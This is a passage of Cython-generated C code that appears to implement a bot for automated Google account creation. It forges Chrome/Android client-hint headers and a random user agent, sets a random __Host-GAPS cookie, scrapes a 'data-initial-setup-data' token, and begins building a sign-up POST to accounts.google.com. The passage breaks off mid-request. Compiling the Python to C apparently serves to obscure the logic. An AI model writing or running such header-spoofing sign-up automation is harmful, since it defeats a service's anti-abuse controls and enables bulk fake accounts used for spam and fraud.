    __pyx_cur_scope = ((struct __pyx_obj_6source___pyx_scope_struct_2_genexpr *)Py_None);
    __Pyx_INCREF(Py_None);
    __PYX_ERR(0, 95, __pyx_L1_error)
  } else {
    __Pyx_GOTREF(__pyx_cur_scope);
  }
  {
    __pyx_CoroutineObject *gen = __Pyx_Generator_New((__pyx_coroutine_body_t) __pyx_gb_6source_3tll_8generator2, NULL, (PyObject *) __pyx_cur_scope, __pyx_n_s_genexpr, __pyx_n_s_tll_locals_genexpr, __pyx_n_s_source); if (unlikely(!gen)) __PYX_ERR(0, 95, __pyx_L1_error)
    __Pyx_DECREF(__pyx_cur_scope);
    __Pyx_RefNannyFinishContext();
    return (PyObject *) gen;
  }

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_AddTraceback("source.tll.genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __Pyx_DECREF(((PyObject *)__pyx_cur_scope));
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_gb_6source_3tll_8generator2(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value) /* generator body */
{
  struct __pyx_obj_6source___pyx_scope_struct_2_genexpr *__pyx_cur_scope = ((struct __pyx_obj_6source___pyx_scope_struct_2_genexpr *)__pyx_generator->closure);
  PyObject *__pyx_r = NULL;
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  Py_ssize_t __pyx_t_3;
  PyObject *(*__pyx_t_4)(PyObject *);
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("genexpr", 0);
  switch (__pyx_generator->resume_label) {
    case 0: goto __pyx_L3_first_run;
    default: /* CPython raises the right error here */
    __Pyx_RefNannyFinishContext();
    return NULL;
  }
  __pyx_L3_first_run:;
  if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 95, __pyx_L1_error)
  __pyx_r = PyList_New(0); if (unlikely(!__pyx_r)) __PYX_ERR(0, 95, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_r);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_rr); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 95, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__3, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 95, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_range, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 95, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (likely(PyList_CheckExact(__pyx_t_1)) || PyTuple_CheckExact(__pyx_t_1)) {
    __pyx_t_2 = __pyx_t_1; __Pyx_INCREF(__pyx_t_2); __pyx_t_3 = 0;
    __pyx_t_4 = NULL;
  } else {
    __pyx_t_3 = -1; __pyx_t_2 = PyObject_GetIter(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 95, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_4 = Py_TYPE(__pyx_t_2)->tp_iternext; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 95, __pyx_L1_error)
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  for (;;) {
    if (likely(!__pyx_t_4)) {
      if (likely(PyList_CheckExact(__pyx_t_2))) {
        if (__pyx_t_3 >= PyList_GET_SIZE(__pyx_t_2)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_1 = PyList_GET_ITEM(__pyx_t_2, __pyx_t_3); __Pyx_INCREF(__pyx_t_1); __pyx_t_3++; if (unlikely(0 < 0)) __PYX_ERR(0, 95, __pyx_L1_error)
        #else
        __pyx_t_1 = PySequence_ITEM(__pyx_t_2, __pyx_t_3); __pyx_t_3++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 95, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
        #endif
      } else {
        if (__pyx_t_3 >= PyTuple_GET_SIZE(__pyx_t_2)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_1 = PyTuple_GET_ITEM(__pyx_t_2, __pyx_t_3); __Pyx_INCREF(__pyx_t_1); __pyx_t_3++; if (unlikely(0 < 0)) __PYX_ERR(0, 95, __pyx_L1_error)
        #else
        __pyx_t_1 = PySequence_ITEM(__pyx_t_2, __pyx_t_3); __pyx_t_3++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 95, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
        #endif
      }
    } else {
      __pyx_t_1 = __pyx_t_4(__pyx_t_2);
      if (unlikely(!__pyx_t_1)) {
        PyObject* exc_type = PyErr_Occurred();
        if (exc_type) {
          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
          else __PYX_ERR(0, 95, __pyx_L1_error)
        }
        break;
      }
      __Pyx_GOTREF(__pyx_t_1);
    }
    __Pyx_XGOTREF(__pyx_cur_scope->__pyx_v_i);
    __Pyx_XDECREF_SET(__pyx_cur_scope->__pyx_v_i, __pyx_t_1);
    __Pyx_GIVEREF(__pyx_t_1);
    __pyx_t_1 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_cc); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 95, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_yy); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 95, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_7 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
      __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_5);
      if (likely(__pyx_t_7)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
        __Pyx_INCREF(__pyx_t_7);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_5, function);
      }
    }
    __pyx_t_1 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_7, __pyx_t_6) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_6);
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 95, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    if (unlikely(__Pyx_ListComp_Append(__pyx_r, (PyObject*)__pyx_t_1))) __PYX_ERR(0, 95, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  }
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  CYTHON_MAYBE_UNUSED_VAR(__pyx_cur_scope);

  /* function exit code */
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_r); __pyx_r = 0;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_AddTraceback("genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  #if !CYTHON_USE_EXC_INFO_STACK
  __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
  #endif
  __pyx_generator->resume_label = -1;
  __Pyx_Coroutine_clear((PyObject*)__pyx_generator);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



static PyObject *__pyx_pf_6source_tll(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_v_n1 = NULL;
  PyObject *__pyx_v_n2 = NULL;
  PyObject *__pyx_v_host = NULL;
  PyObject *__pyx_v_he3 = NULL;
  PyObject *__pyx_v_res1 = NULL;
  PyObject *__pyx_v_tok = NULL;
  PyObject *__pyx_v_cookies = NULL;
  PyObject *__pyx_v_headers = NULL;
  PyObject *__pyx_v_data = NULL;
  PyObject *__pyx_v_response = NULL;
  PyObject *__pyx_v_tl = NULL;
  PyObject *__pyx_v_f = NULL;
  PyObject *__pyx_v_e = NULL;
  PyObject *__pyx_gb_6source_3tll_2generator = 0;
  PyObject *__pyx_gb_6source_3tll_5generator1 = 0;
  PyObject *__pyx_gb_6source_3tll_8generator2 = 0;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  int __pyx_t_9;
  PyObject *__pyx_t_10 = NULL;
  PyObject *__pyx_t_11 = NULL;
  PyObject *__pyx_t_12 = NULL;
  PyObject *__pyx_t_13 = NULL;
  PyObject *__pyx_t_14 = NULL;
  PyObject *__pyx_t_15 = NULL;
  int __pyx_t_16;
  int __pyx_t_17;
  int __pyx_t_18;
  char const *__pyx_t_19;
  PyObject *__pyx_t_20 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("tll", 0);

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      
      __pyx_t_4 = __pyx_pf_6source_3tll_genexpr(NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 93, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_5 = __Pyx_Generator_Next(__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 93, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = PyUnicode_Join(__pyx_kp_u__4, __pyx_t_5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 93, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_v_n1 = ((PyObject*)__pyx_t_4);
      __pyx_t_4 = 0;

      
      __pyx_t_4 = __pyx_pf_6source_3tll_3genexpr(NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 94, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_5 = __Pyx_Generator_Next(__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 94, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = PyUnicode_Join(__pyx_kp_u__4, __pyx_t_5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 94, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_v_n2 = ((PyObject*)__pyx_t_4);
      __pyx_t_4 = 0;

      
      __pyx_t_4 = __pyx_pf_6source_3tll_6genexpr(NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 95, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_5 = __Pyx_Generator_Next(__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 95, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = PyUnicode_Join(__pyx_kp_u__4, __pyx_t_5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 95, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_v_host = __pyx_t_4;
      __pyx_t_4 = 0;

      
      __pyx_t_4 = __Pyx_PyDict_NewPresized(22); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 96, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_accept, __pyx_kp_u__5) < 0) __PYX_ERR(0, 96, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_accept_language, __pyx_kp_u_ar_IQ_ar_q_0_9_en_IQ_q_0_8_en_q) < 0) __PYX_ERR(0, 96, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_content_type, __pyx_kp_u_application_x_www_form_urlencode) < 0) __PYX_ERR(0, 96, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_google_accounts_xsrf, __pyx_kp_u_1) < 0) __PYX_ERR(0, 96, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_sec_ch_ua, __pyx_kp_u_Not_A_Brand_v_24_Chromium_v_116) < 0) __PYX_ERR(0, 96, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_sec_ch_ua_arch, __pyx_kp_u__6) < 0) __PYX_ERR(0, 96, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_sec_ch_ua_bitness, __pyx_kp_u__6) < 0) __PYX_ERR(0, 96, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_sec_ch_ua_full_version, __pyx_kp_u_116_0_5845_72) < 0) __PYX_ERR(0, 96, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_sec_ch_ua_full_version_list, __pyx_kp_u_Not_A_Brand_v_24_0_0_0_Chromium) < 0) __PYX_ERR(0, 96, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_sec_ch_ua_mobile, __pyx_kp_u_1_2) < 0) __PYX_ERR(0, 96, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_sec_ch_ua_model, __pyx_kp_u_ANY_LX2) < 0) __PYX_ERR(0, 96, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_sec_ch_ua_platform, __pyx_kp_u_Android) < 0) __PYX_ERR(0, 96, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_sec_ch_ua_platform_version, __pyx_kp_u_13_0_0) < 0) __PYX_ERR(0, 96, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_sec_ch_ua_wow64, __pyx_kp_u_0) < 0) __PYX_ERR(0, 96, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_sec_fetch_dest, __pyx_n_u_empty) < 0) __PYX_ERR(0, 96, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_sec_fetch_mode, __pyx_n_u_cors) < 0) __PYX_ERR(0, 96, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_sec_fetch_site, __pyx_kp_u_same_origin) < 0) __PYX_ERR(0, 96, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_x_chrome_connected, __pyx_kp_u_source_Chrome_eligible_for_consi) < 0) __PYX_ERR(0, 96, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_x_client_data, __pyx_kp_u_CJjbygE) < 0) __PYX_ERR(0, 96, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_x_same_domain, __pyx_kp_u_1) < 0) __PYX_ERR(0, 96, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Referrer_Policy, __pyx_kp_u_strict_origin_when_cross_origin) < 0) __PYX_ERR(0, 96, __pyx_L3_error)

      
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_gg); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 117, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_7 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_7)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_7);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_5 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 117, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 117, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_user_agent, __pyx_t_6) < 0) __PYX_ERR(0, 96, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_v_he3 = ((PyObject*)__pyx_t_4);
      __pyx_t_4 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_requests); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 118, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_get); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 118, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      
      __pyx_t_4 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 120, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_headers, __pyx_v_he3) < 0) __PYX_ERR(0, 120, __pyx_L3_error)

      
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_tuple__7, __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 118, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_v_res1 = __pyx_t_5;
      __pyx_t_5 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_re); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 121, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_search); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 121, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

      
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_res1, __pyx_n_s_text); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 123, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_8 = NULL;
      __pyx_t_9 = 0;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_7))) {
        __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_7);
        if (likely(__pyx_t_8)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
          __Pyx_INCREF(__pyx_t_8);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_7, function);
          __pyx_t_9 = 1;
        }
      }
      #if CYTHON_FAST_PYCALL
      if (PyFunction_Check(__pyx_t_7)) {
        PyObject *__pyx_temp[3] = {__pyx_t_8, __pyx_kp_u_data_initial_setup_data_null_nul, __pyx_t_6};
        __pyx_t_4 = __Pyx_PyFunction_FastCall(__pyx_t_7, __pyx_temp+1-__pyx_t_9, 2+__pyx_t_9); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 121, __pyx_L3_error)
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      } else
      #endif
      #if CYTHON_FAST_PYCCALL
      if (__Pyx_PyFastCFunction_Check(__pyx_t_7)) {
        PyObject *__pyx_temp[3] = {__pyx_t_8, __pyx_kp_u_data_initial_setup_data_null_nul, __pyx_t_6};
        __pyx_t_4 = __Pyx_PyCFunction_FastCall(__pyx_t_7, __pyx_temp+1-__pyx_t_9, 2+__pyx_t_9); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 121, __pyx_L3_error)
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      } else
      #endif
      {
        __pyx_t_10 = PyTuple_New(2+__pyx_t_9); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 121, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_10);
        if (__pyx_t_8) {
          __Pyx_GIVEREF(__pyx_t_8); PyTuple_SET_ITEM(__pyx_t_10, 0, __pyx_t_8); __pyx_t_8 = NULL;
        }
        __Pyx_INCREF(__pyx_kp_u_data_initial_setup_data_null_nul);
        __Pyx_GIVEREF(__pyx_kp_u_data_initial_setup_data_null_nul);
        PyTuple_SET_ITEM(__pyx_t_10, 0+__pyx_t_9, __pyx_kp_u_data_initial_setup_data_null_nul);
        __Pyx_GIVEREF(__pyx_t_6);
        PyTuple_SET_ITEM(__pyx_t_10, 1+__pyx_t_9, __pyx_t_6);
        __pyx_t_6 = 0;
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_t_10, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 121, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      }
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_group); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 123, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
        __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_7);
        if (likely(__pyx_t_4)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
          __Pyx_INCREF(__pyx_t_4);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_7, function);
        }
      }
      __pyx_t_5 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_7, __pyx_t_4, __pyx_int_2) : __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_int_2);
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 123, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_v_tok = __pyx_t_5;
      __pyx_t_5 = 0;

      
      __pyx_t_5 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 124, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      if (PyDict_SetItem(__pyx_t_5, __pyx_kp_u_Host_GAPS, __pyx_v_host) < 0) __PYX_ERR(0, 124, __pyx_L3_error)
      __pyx_v_cookies = ((PyObject*)__pyx_t_5);
      __pyx_t_5 = 0;

      
      __pyx_t_5 = __Pyx_PyDict_NewPresized(8); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 126, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      if (PyDict_SetItem(__pyx_t_5, __pyx_n_u_authority, __pyx_kp_u_accounts_google_com) < 0) __PYX_ERR(0, 126, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_5, __pyx_n_u_accept, __pyx_kp_u__5) < 0) __PYX_ERR(0, 126, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_5, __pyx_kp_u_accept_language, __pyx_kp_u_en_US_en_q_0_9) < 0) __PYX_ERR(0, 126, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_5, __pyx_kp_u_content_type, __pyx_kp_u_application_x_www_form_urlencode) < 0) __PYX_ERR(0, 126, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_5, __pyx_kp_u_google_accounts_xsrf, __pyx_kp_u_1) < 0) __PYX_ERR(0, 126, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_5, __pyx_n_u_origin, __pyx_kp_u_https_accounts_google_com) < 0) __PYX_ERR(0, 126, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_5, __pyx_n_u_referer, __pyx_kp_u_https_accounts_google_com_signup) < 0) __PYX_ERR(0, 126, __pyx_L3_error)

      
      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_gg); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 133, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_10 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_4);
        if (likely(__pyx_t_10)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
          __Pyx_INCREF(__pyx_t_10);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_4, function);
        }
      }
      __pyx_t_7 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 133, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      if (PyDict_SetItem(__pyx_t_5, __pyx_kp_u_user_agent, __pyx_t_7) < 0) __PYX_ERR(0, 126, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_v_headers = ((PyObject*)__pyx_t_5);
      __pyx_t_5 = 0;

      
      __pyx_t_5 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 135, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_7 = PyNumber_Add(__pyx_kp_u__8, __pyx_v_tok); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 135, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_4 = PyNumber_Add(__pyx_t_7, __pyx_kp_u__9); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 135, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = PyNumber_Add(__pyx_t_4, __pyx_v_n1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 135, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = PyNumber_Add(__pyx_t_7, __pyx_kp_u__9); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 135, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = PyNumber_Add(__pyx_t_4, __pyx_v_n2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 135, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
